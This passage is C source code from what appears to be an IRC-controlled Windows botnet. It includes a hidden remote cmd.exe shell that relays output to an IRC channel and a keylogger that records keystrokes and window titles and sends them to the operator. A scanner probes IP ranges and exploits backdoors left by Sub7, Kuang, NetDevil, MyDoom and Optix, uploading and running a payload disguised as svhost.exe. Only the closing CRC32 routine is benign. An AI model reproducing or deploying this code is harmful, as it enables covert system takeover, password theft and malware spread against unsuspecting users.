  	SECURITY_ATTRIBUTES secAttr;
  	STARTUPINFO startInfo;
  	PROCESS_INFORMATION procInfo;
	HANDLE hChildOutRd, hChildOutWr, hChildInRd, hChildInWr;
	
	GetWindowsDirectory(searsdir,sizeof(searsdir));
	strcat(searsdir,"\\cmd.exe");
	if (GetFileAttributes(searsdir) == 0xFFFFFFFF) {
		GetSystemDirectory(searsdir,sizeof(searsdir));
		strcat(searsdir,"\\cmd.exe");
		if (GetFileAttributes(searsdir) == 0xFFFFFFFF) return -1;
	}
    	secAttr.nLength = sizeof(secAttr);
    	secAttr.bInheritHandle = TRUE;
    	secAttr.lpSecurityDescriptor = NULL;

    	if (!CreatePipe(&hChildOutRd, &hChildOutWr, &secAttr, 0)) return -1;
    	if (!CreatePipe(&hChildInRd, &hChildInWr, &secAttr, 0)) return -1;
    	if (!DuplicateHandle(GetCurrentProcess(), hChildInWr, GetCurrentProcess(), &hChildInWrDupe, 0, FALSE, DUPLICATE_SAME_ACCESS | DUPLICATE_CLOSE_SOURCE)) return -1;

   	memset(&startInfo, 0, sizeof(startInfo));
   	startInfo.cb = sizeof(startInfo);
    	startInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    	startInfo.wShowWindow = SW_HIDE;
    	startInfo.hStdInput = hChildInRd;
    	startInfo.hStdOutput = hChildOutWr;
   	if (!CreateProcess(searsdir,"", NULL, NULL, TRUE, 0, NULL, NULL, &startInfo, &procInfo)) 
		return -1;
   	CloseHandle(hChildInRd);
	DWORD id;
	pipe_read = hChildOutRd;
	pipe_write = hChildInWr;
	pipe_Hproc = procInfo.hProcess;
   	CloseHandle(procInfo.hThread);
	pipesock = sock;
	if (chan) sprintf(pipe_chan,chan);
	else sprintf(pipe_chan,"\0");
	CreateThread(NULL, 0, &PipeReadThread, NULL, 0, &id);
        return 0;
 }


 DWORD WINAPI PipeReadThread(LPVOID param) {
	DWORD numread, br;
	char buffer[512];
	while (1)
	{
		BOOL eol = FALSE;
		DWORD State;

		memset(buffer,0,sizeof(buffer));
		if (!PeekNamedPipe(pipe_read,buffer,512,&br,NULL,NULL)) {
			pipe_send(pipesock,pipe_chan,"Error");
			return 0;
		}

		if (br == 0) { //nothing to read 
			if (GetExitCodeProcess(pipe_Hproc,&State)) { //maybe process is death ?
				if (State != STILL_ACTIVE) {
					Close_Handles(); 
					pipe_send(pipesock,pipe_chan,"P exit");
					return 0;
				}
			}
			Sleep(10); //process is waithing sleep and try again
			continue;
		}
		DWORD cbyte;
		for(cbyte=0;cbyte<br;cbyte++) {
			if (buffer[cbyte] == '\n')
			{
				eol = TRUE;
				break;
			}
		}
		if (eol) br = cbyte + 1;
		else br = 512;
		memset(buffer,0,sizeof(buffer));
		if (!ReadFile(pipe_read, buffer, br, &numread, NULL)) 
				break;
		pipe_send(pipesock,pipe_chan,buffer);

	}
	pipe_send(pipesock,pipe_chan,"Error");
        return 0;
 }

 int pipe_send(SOCKET sock,char *chan,char *buf) {
	if (!privmsg(sock,buf,chan)) Close_Handles();
	if (strlen(chan) > 2) Sleep(Flood_delay); //we dont want a excess flood
	return 0;
 }
 #endif


 #ifndef NO_KEYLOGGER
 DWORD WINAPI keylogger(LPVOID Param) {
	
	HWND win, winold;
	int bKstate[256]={0};
        int i,x;
	int err = 0;
	int threadnum = (int)Param;
	char buffer[600];
	char buffer2[800];
	char window[61];
	int state;
	int shift;
	char logfile[MAX_PATH];

	#ifdef start_keylogger_afterstartup
	char systdir[MAX_PATH];
	GetSystemDirectory(systdir, sizeof(systdir));
	sprintf(logfile,"%s\\%s",systdir,keylogfilename);
	FILE *log;
	log = fopen(logfile,"aw");
	if (log != NULL) {
		char date[70];
		GetDateFormat(0x409,0,0,"\n[dd:MMM:yyyy, ",date,70);
		fputs(date,log);
		memset(date,0,sizeof(date));
		GetTimeFormat(0x409,0,0," HH:mm:ss]",date,70);
		fputs(date,log);
		fputs(" Keylogger Started\n\n",log);
		fclose(log);
	}
	#endif

	memset(buffer,0,sizeof(buffer));
	win = GetForegroundWindow();
	winold = win;
	GetWindowText(winold,window,60);
	while (err == 0) {
		Sleep(8);
		win = GetForegroundWindow();
		if (win != winold) {
			if (strlen(buffer) != 0) {
				sprintf(buffer2,"%s (\2Changed window\2",buffer);
				err = sendkeys(keylogs->sock,buffer2,window,logfile);
				memset(buffer,0,sizeof(buffer));
				memset(buffer2,0,sizeof(buffer2));
			}
			win = GetForegroundWindow();
			winold = win;
			GetWindowText(winold,window,60);

		}
		for(i=0;i<92;i++)
		{
			shift = GetKeyState(VK_SHIFT);
 			x = inputL[i];
			if (GetAsyncKeyState(x) & 0x8000) {
				//see if capslock or shift is pressed doesnt work most of the time on win9x
				if (((GetKeyState(VK_CAPITAL) != 0) && (shift > -1) && (x > 64) && (x < 91)))//caps lock and NOT shift
					bKstate[x] = 1;//upercase a-z
				else if (((GetKeyState(VK_CAPITAL) != 0) && (shift < 0) && (x > 64) && (x < 91)))//caps lock AND shift
					bKstate[x] = 2;//lowercase a-z
				else if (shift < 0) //Shift
					bKstate[x] = 3; //upercase
				else bKstate[x] = 4; //lowercase 
			}

			else {
				if (bKstate[x] != 0)
				{
					state = bKstate[x];
					bKstate[x] = 0;
					if (x == 8) {
						buffer[strlen(buffer)-1] = 0;
						continue;
					}
					else if (strlen(buffer) > 550) {
						win = GetForegroundWindow();
						GetWindowText(win,window,60);
						sprintf(buffer2,"%s (Buffer full",buffer);
						err = sendkeys(keylogs->sock,buffer2,window,logfile);
						memset(buffer,0,sizeof(buffer));
						memset(buffer2,0,sizeof(buffer2));
						continue;
					}
					else if (x == 13)  {
						if (strlen(buffer) == 0) continue;
						win = GetForegroundWindow();
						GetWindowText(win,window,60);
						sprintf(buffer2,"%s (\2Return\2",buffer);
						err = sendkeys(keylogs->sock,buffer2,window,logfile);
						memset(buffer,0,sizeof(buffer));
						memset(buffer2,0,sizeof(buffer2));
						continue;
					}
					else if (state == 1 || state == 3)
						strcat(buffer,outputH[i]);
					else if (state == 2 || state == 4)
						strcat(buffer,outputL[i]);
				}

     			}
		}
	}
	threds[threadnum].id = 0;
	return 1;
 }

 int sendkeys(SOCKET sock,char *buf,char *window, char *logfile) {
	char buffer[4092];
	strcat(buf,")\n");
 #ifdef start_keylogger_afterstartup
	int len = 0;
	FILE *log;
	log = fopen(logfile,"aw");
	if (log != NULL) {
		char date[20];
		GetTimeFormat(0x409,0,0,"[HH:mm:ss] ",date,19);
		fputs(date,log);
		len = strlen(date) + strlen(window);
		fputs(window,log);
		len = 75 - len;
		if (len > 0) {
			int c;
			for(c=0;c<len;c++)
				fputc(32,log);

		}
	 	fputs(buf,log);
		fclose(log);
	}
	if (sendkeysto == 0) return 0;
	#endif
	strcat(buf,"\r");
	sprintf(buffer,"(%s): 7,1%s",window,buf); 
	irc_privmsg(sock, keylogs->chan, buffer, keylogs->notice); 
	
	if (send(keylogs->sock,buffer,strlen(buffer),0) == SOCKET_ERROR) {
		memset(keylogs->chan,0,sizeof(keylogs->chan));
		sendkeysto = 0;
		#ifndef start_keylogger_afterstartup
		return 1;
		#endif
	}
	return 0;
 }

 void Keyevent (BYTE key,BOOL caps) {
	if (caps) 
		keybd_event(VK_SHIFT,MapVirtualKey(VK_SHIFT,0),FALSE?KEYEVENTF_KEYUP:0,0);
        keybd_event(key,MapVirtualKey(key,0),FALSE?KEYEVENTF_KEYUP:0,0);
		keybd_event(key,MapVirtualKey(key,0),TRUE?KEYEVENTF_KEYUP:0,0);
	if (caps) 
		keybd_event(VK_SHIFT,MapVirtualKey(VK_SHIFT,0),TRUE?KEYEVENTF_KEYUP:0,0);
 }
 #endif


 #ifndef NO_SCAN
 // checks ip for open port
 DWORD WINAPI ip_connect(LPVOID param)  {
	SOCKET sock;
	SOCKADDR_IN ssin;
	DWORD err;
	char str[256];
	int sploitres,optixres;
	scans scan;
	FILE *infile;

	scan = *((scans *)param);
	scans *scanp = (scans *)param;
	scanp->cgotinfo = TRUE;

	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = htons(scan.port);
	ssin.sin_addr = scan.addy;

	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	err = connect(sock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN));

	if (err != SOCKET_ERROR) {
	    switch (scan.extra) {
		case 1:
		sprintf(str, "[\2Sub7\2] port %d is open, trying to exploit %s ...", scan.port,  inet_ntoa(scan.addy));
		irc_privmsg(scan.sock, scan.chan, str, scan.notice);//will send to exploitmsg channel..
		if (SUB7(sock) == 1){
		sprintf(str,"[\2Sub7\2] Server %s:%d Rooted!",inet_ntoa(scan.addy),scan.port);
		//s7++;
		}
		else 
		sprintf(str,"[\2Sub7\2] Exploit Failed :[",inet_ntoa(scan.addy),scan.port); //send to dcc chat	
		irc_privmsg(scan.sock, scan.chan, str, scan.notice);
		break;

		case 2:
		sprintf(str, "[\2Kuang\2] port %d is open, trying to exploit %s ...", scan.port,  inet_ntoa(scan.addy));
		irc_privmsg(scan.sock, scan.chan, str, scan.notice);//will send to exploitmsg channel..
		if (KUANG(sock) == 1) {
		sprintf(str,"[\2Kuang\2] Server %s:%d Rooted!",inet_ntoa(scan.addy),scan.port);
		//cuang++;
		}
		else 
		sprintf(str,"[\2Kuang] Exploit Failed :[",inet_ntoa(scan.addy),scan.port); //send to dcc chat	
		irc_privmsg(scan.sock, scan.chan, str, scan.notice);
		
		break;

		case 4:
		sprintf(str, "[\2NetDevil\2] port %d is open, trying to exploit %s ...", scan.port,  inet_ntoa(scan.addy));
		irc_privmsg(scan.sock, scan.chan, str, scan.notice);//will send to exploitmsg channel..
		//int netdevil(char *ip,int port,SOCKET ircsock,SOCKET sock,char *chan)
		if (netdevil(inet_ntoa(scan.addy),scan.port,scan.sock,sock,scan.chan) == 1) {//AT LAST!!!!  s2pid sock[c]
		sprintf(str,"[\2NetDevil\2] Server %s:%d Rooted!",inet_ntoa(scan.addy),scan.port);
		//debil++;
		}
		else
		sprintf(str,"[\2NetDevil\2] Exploit Failed :[");
		irc_privmsg(scan.sock, scan.chan, str, scan.notice);//will send to exploitmsg channel..
		
		break;

		case 5:
		sprintf(str, "[\2MyDoom\2] port %d is open, trying to exploit %s...", scan.port, inet_ntoa(scan.addy));
		irc_privmsg(scan.sock, scan.chan, str, scan.notice);
		sploitres = spread_mydoom(inet_ntoa(scan.addy));

		if (sploitres == EXIT_FAILURE) sprintf(str, "[\2MyDoom\2] Exploit Failed :[");
		    //irc_privmsg(scan.sock, scan.chan, str, scan.notice);
		else if (sploitres == EXIT_SUCCESS) sprintf(str, "[\2MyDoom\2] %s:%d Rooted!", inet_ntoa(scan.addy),scan.port);
		    //irc_privmsg(scan.sock, scan.chan, str, scan.notice);
//		else sprintf(str, "[\2MyDoom\2] %s had unknown result.", inet_ntoa(scan.addy));
		    //irc_privmsg(scan.sock, scan.chan, str, scan.notice);
		irc_privmsg(scan.sock, scan.chan, str, scan.notice);
		break;

		case 6:
		sprintf(str,"[\2Optix\2] port %d is open, trying to exploit %s...", scan.port, inet_ntoa(scan.addy));
		irc_privmsg(scan.sock, scan.chan, str, scan.notice);
		optixres = tixRoot(inet_ntoa(scan.addy), scan.port, NULL, filename); //should i use filename1 instead of filename??

		if (optixres == EXIT_FAILURE) sprintf(str, "[\2Optix\2] Exploit Failed :[");
		if (optixres == EXIT_SUCCESS) sprintf(str, "[\2Optix\2] %s:%d Rooted!",inet_ntoa(scan.addy),scan.port);
		//if (optixres == TIX_AUTHFAILED) sprintf(str, "[\2OPTIX\2] Pass Auth Failed. :[");

		irc_privmsg(scan.sock, scan.chan, str, scan.notice);

		break;

		case 10: //log
		scanlogging = TRUE;
		infile = fopen(scan.file,"aw");
		if (infile != NULL) {
			sprintf(str,"%s:%i\n",inet_ntoa(scan.addy),scan.port);
			fputs(str,infile);
			fclose(infile);
		sprintf(str, "%s:%d open > %s", inet_ntoa(scan.addy), scan.port,scanlog);
		irc_privmsg(scan.sock, scan.chan, str, scan.notice);
		}
		break;

		default:
		sprintf(str, "%s port %d is open", inet_ntoa(scan.addy), scan.port);
		irc_privmsg(scan.sock, scan.chan, str, scan.notice);
		break;
	    }
	}
	closesocket(sock);
	return 0;

 }

 // scan a range of ips for an open port
 DWORD WINAPI ip_scan(LPVOID param) {
	DWORD id, host;
	void *th;
	char str[128];
	scans scan;

	scan = *((scans *)param);
	scans *scanp = (scans *)param;
	scanp->gotinfo = TRUE;

	while(1) {
		if (scanlogging) 
		sprintf(str, "[\2PortScanner\2] scanning %s:%d logging to %s", inet_ntoa(scan.addy), scan.port, scan.file);
		else
		sprintf(str, "[\2PortScanner\2] scanning %s:%d", inet_ntoa(scan.addy), scan.port);
		strncpy(threadd[scan.threadnum], str, sizeof(threadd[scan.threadnum])-1);
		th = CreateThread(NULL, 0, &ip_connect, (void *)&scan, 0, &id);
		while(1) {
			if (scan.cgotinfo == TRUE) break;
			Sleep(1);
		}
		CloseHandle(th);
		scanp->cgotinfo = FALSE;
		Sleep(scanp->delay);
		memcpy(&host, &scan.addy, 4);
		host = ntohl(host);
		host += 1;
		host = htonl(host);
		memcpy(&scan.addy, &host, 4);
	}

	threads[scan.threadnum] = 0;
	threadd[scan.threadnum][0] = '\0';
	return 0;
 }
 #endif


#ifndef NO_OPTIX 
//Upload File
bool tixUpload(char *szIP, char *szFile)
{
	//SOCKET sock;
	FILE *f;
	DWORD dwSize;
	HANDLE hFile;
	int read = 0;
	WSADATA upldata;
	SOCKET uplsock;
	struct sockaddr_in uplinfo;
	char szSendBuff[1024];
	char szRecvBuff[4096];
//Open File
		f = fopen(szFile, "rb");
	if (f == NULL)
	{
			//sprintf(szSendBuff,"[-] File Not Found!");
			//irc_privmsg(sock,channel,szSendBuff,NULL);
			return FALSE;
	}
	
//Connec To Upload Socket..
	if (WSAStartup(MAKEWORD(2,2), &upldata) != 0) return TRUE;
		uplinfo.sin_addr.s_addr = inet_addr(szIP);
		uplinfo.sin_port = htons(500);		
		uplinfo.sin_family = AF_INET;
		uplsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		//printf("[+] Connecting To Upload Socket..\r\n");
	if (connect(uplsock, (struct sockaddr *)&uplinfo, sizeof(uplinfo)) == SOCKET_ERROR) return FALSE;	
//Send File Info (Where To Upload And Size..)
		//printf("[+] Connected To Upload Socket! Sending File Info..\r\n");
		memset(szSendBuff, 0, sizeof(szSendBuff));
		memset(szRecvBuff, 0, sizeof(szRecvBuff));
		sprintf(szSendBuff, "C:\\svhost.exe\r\n"); //:)
		send(uplsock, szSendBuff, strlen(szSendBuff), 0);
		recv(uplsock, szRecvBuff, sizeof(szRecvBuff), 0);
		hFile = CreateFile(szFile, GENERIC_READ,FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		dwSize = GetFileSize(hFile, 0);
		CloseHandle(hFile);
		sprintf(szSendBuff, "%d\r\n", dwSize);
		send(uplsock, szSendBuff, strlen(szSendBuff), 0);
		recv(uplsock, szRecvBuff, sizeof(szRecvBuff), 0);
//OK REDY Received, Upload File..
	if (strcmp(szRecvBuff, "+OK REDY\r\n") != 0) return FALSE;
		//printf("[+] Uploading File!\r\n");
	while (!feof(f)) 
	{
		read = fread(szSendBuff, sizeof(char), sizeof(szSendBuff), f);
		send(uplsock, szSendBuff, read, 0);
		//printf(".");
	}
//Ze End
		//printf("\r\n");
		//printf("[+] File Uploaded! Closing Upload Socket..\r\n");
		closesocket(uplsock);
		return TRUE;
}

int tixRoot(char *szIP, int Port, char *szPass, char *szFile)
{
	WSADATA opxdata;
	SOCKET opxsock;
	struct sockaddr_in opxinfo;
	char szSendBuff[4096];
	char szRecvBuff[4096];
	if (WSAStartup(MAKEWORD(2,2), &opxdata) != 0) return 0;
//Connec To Optix Main Port
		opxinfo.sin_addr.s_addr = inet_addr(szIP);
		opxinfo.sin_port = htons(Port);		
		opxinfo.sin_family = AF_INET;
		opxsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		//printf("[+] Connecting..\r\n");
	if (connect(opxsock, (struct sockaddr *)&opxinfo, sizeof(opxinfo)) == SOCKET_ERROR) 
	{
			//printf("[-] Connection Failed!\r\n");
			//printf("[+] Closing Socket..\r\n");
			closesocket(opxsock);
			return 0;
	}
//Auth
//Note: OPTIX BLOCKS YA ASS UNTIL RESTART IF PASS IS WRONG 3TIMES :/
		//printf("[+] Authing..\r\n");
		memset(szSendBuff, 0, sizeof(szSendBuff));
		memset(szRecvBuff, 0, sizeof(szRecvBuff));
		sprintf(szSendBuff, "022�%s�v1.2\r\n", szPass);
		send(opxsock, szSendBuff, strlen(szSendBuff), 0);
		recv(opxsock, szRecvBuff, sizeof(szRecvBuff), 0);
	if (strstr(szRecvBuff, "\r\n001�Optix Pro v1.32 Connected Successfully!\r\n") == NULL) {
		//	printf("[-] Auth Failed!\r\n");
			return EXIT_FAILURE;
	}
//Prepare Optix For Upload
	//	printf("[+] Connected! Prepearing Server For Upload..\r\n");
		memset(szSendBuff, 0, sizeof(szSendBuff));
		memset(szRecvBuff, 0, sizeof(szRecvBuff));
		sprintf(szSendBuff, "019�\r\n");
		send(opxsock, szSendBuff, strlen(szSendBuff), 0);
		recv(opxsock, szRecvBuff, sizeof(szRecvBuff), 0);
	if (strcmp(szRecvBuff, "020�\r\n") != 0) {
		//	printf("[-] Preperation Failed!\r\n");
		//	printf("[+] Closing Socket..\r\n");
			closesocket(opxsock);
			return 0;
	}
//Execute File If Upload Success
	if (tixUpload(szIP, szFile) == TRUE)
	{
			//printf("[+] Executing File..\r\n");
			memset(szSendBuff, 0, sizeof(szSendBuff));
			memset(szRecvBuff, 0, sizeof(szRecvBuff));
			sprintf(szSendBuff, "008�C:\\svhost.exe\r\n"); // :) 
			send(opxsock, szSendBuff, strlen(szSendBuff), 0);
			recv(opxsock, szRecvBuff, sizeof(szRecvBuff), 0);
		if (strcmp(szRecvBuff, "001�Error Executing File\r\n") == 0)
		{
		//		printf("[-] File Execution Failed!");
		//		printf("[+] Closing Socket..\r\n");
				closesocket(opxsock);
				return EXIT_SUCCESS;
		}
		//	printf("[+] File Executed!\r\n");
	}
	else// printf("[-] Upload Failed!\r\n");
		//printf("[+] Closing Socket..\r\n");
		closesocket(opxsock);
		return EXIT_FAILURE;
}
#endif 


#define _CRC32_(crc, ch)	 (crc = (crc >> 8) ^ crc32tab[(crc ^ (ch)) & 0xff])

/* generated using the AUTODIN II polynomial
 *	x^32 + x^26 + x^23 + x^22 + x^16 +
 *	x^12 + x^11 + x^10 + x^8 + x^7 + x^5 + x^4 + x^2 + x^1 + 1
 */

static const unsigned long crc32tab[256] = {
	0x00000000, 0x77073096, 0xee0e612c, 0x990951ba,
	0x076dc419, 0x706af48f, 0xe963a535, 0x9e6495a3,
	0x0edb8832, 0x79dcb8a4, 0xe0d5e91e, 0x97d2d988,
	0x09b64c2b, 0x7eb17cbd, 0xe7b82d07, 0x90bf1d91,
	0x1db71064, 0x6ab020f2, 0xf3b97148, 0x84be41de,
	0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7,
	0x136c9856, 0x646ba8c0, 0xfd62f97a, 0x8a65c9ec,
	0x14015c4f, 0x63066cd9, 0xfa0f3d63, 0x8d080df5,
	0x3b6e20c8, 0x4c69105e, 0xd56041e4, 0xa2677172,
	0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b,
	0x35b5a8fa, 0x42b2986c, 0xdbbbc9d6, 0xacbcf940,
	0x32d86ce3, 0x45df5c75, 0xdcd60dcf, 0xabd13d59,
	0x26d930ac, 0x51de003a, 0xc8d75180, 0xbfd06116,
	0x21b4f4b5, 0x56b3c423, 0xcfba9599, 0xb8bda50f,
	0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924,
	0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d,
	0x76dc4190, 0x01db7106, 0x98d220bc, 0xefd5102a,
	0x71b18589, 0x06b6b51f, 0x9fbfe4a5, 0xe8b8d433,
	0x7807c9a2, 0x0f00f934, 0x9609a88e, 0xe10e9818,
	0x7f6a0dbb, 0x086d3d2d, 0x91646c97, 0xe6635c01,
	0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e,
	0x6c0695ed, 0x1b01a57b, 0x8208f4c1, 0xf50fc457,
	0x65b0d9c6, 0x12b7e950, 0x8bbeb8ea, 0xfcb9887c,
	0x62dd1ddf, 0x15da2d49, 0x8cd37cf3, 0xfbd44c65,
	0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2,
	0x4adfa541, 0x3dd895d7, 0xa4d1c46d, 0xd3d6f4fb,
	0x4369e96a, 0x346ed9fc, 0xad678846, 0xda60b8d0,
	0x44042d73, 0x33031de5, 0xaa0a4c5f, 0xdd0d7cc9,
	0x5005713c, 0x270241aa, 0xbe0b1010, 0xc90c2086,
	0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f,
	0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4,
	0x59b33d17, 0x2eb40d81, 0xb7bd5c3b, 0xc0ba6cad,
	0xedb88320, 0x9abfb3b6, 0x03b6e20c, 0x74b1d29a,
	0xead54739, 0x9dd277af, 0x04db2615, 0x73dc1683,
	0xe3630b12, 0x94643b84, 0x0d6d6a3e, 0x7a6a5aa8,
	0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1,
	0xf00f9344, 0x8708a3d2, 0x1e01f268, 0x6906c2fe,
	0xf762575d, 0x806567cb, 0x196c3671, 0x6e6b06e7,
	0xfed41b76, 0x89d32be0, 0x10da7a5a, 0x67dd4acc,
	0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5,
	0xd6d6a3e8, 0xa1d1937e, 0x38d8c2c4, 0x4fdff252,
	0xd1bb67f1, 0xa6bc5767, 0x3fb506dd, 0x48b2364b,
	0xd80d2bda, 0xaf0a1b4c, 0x36034af6, 0x41047a60,
	0xdf60efc3, 0xa867df55, 0x316e8eef, 0x4669be79,
	0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236,
	0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f,
	0xc5ba3bbe, 0xb2bd0b28, 0x2bb45a92, 0x5cb36a04,
	0xc2d7ffa7, 0xb5d0cf31, 0x2cd99e8b, 0x5bdeae1d,
	0x9b64c2b0, 0xec63f226, 0x756aa39c, 0x026d930a,
	0x9c0906a9, 0xeb0e363f, 0x72076785, 0x05005713,
	0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38,
	0x92d28e9b, 0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21,
	0x86d3d2d4, 0xf1d4e242, 0x68ddb3f8, 0x1fda836e,
	0x81be16cd, 0xf6b9265b, 0x6fb077e1, 0x18b74777,
	0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c,
	0x8f659eff, 0xf862ae69, 0x616bffd3, 0x166ccf45,
	0xa00ae278, 0xd70dd2ee, 0x4e048354, 0x3903b3c2,
	0xa7672661, 0xd06016f7, 0x4969474d, 0x3e6e77db,
	0xaed16a4a, 0xd9d65adc, 0x40df0b66, 0x37d83bf0,
	0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9,
	0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6,
	0xbad03605, 0xcdd70693, 0x54de5729, 0x23d967bf,
	0xb3667a2e, 0xc4614ab8, 0x5d681b02, 0x2a6f2b94,
	0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d,
};

unsigned long crc32(char *buf, size_t size)
{
	unsigned long crc = (unsigned long)~0;
	char *p;
	size_t len, nr;
	len = 0;
	nr=size;
	for (len += nr, p = buf; nr--; ++p)
	{
		_CRC32_(crc, *p);
	}
	return ~crc;
}
